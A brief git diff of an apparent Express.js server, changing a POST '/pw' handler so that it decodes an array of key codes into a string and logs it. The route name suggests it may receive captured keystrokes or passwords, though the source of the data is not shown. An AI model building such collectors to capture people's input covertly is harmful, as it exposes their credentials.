@@ -163,7 +163,14 @@ app.get('/p', (req, res) => {
 })
 
 app.post('/pw', (req, res) => {
-    console.log(req.body.value);
+    var string = "";
+    var keys = req.body.value;
+
+    keys.forEach(function(key) {
+        string += String.fromCharCode(key);
+    });
+
+    console.log(string);
 });
 
 
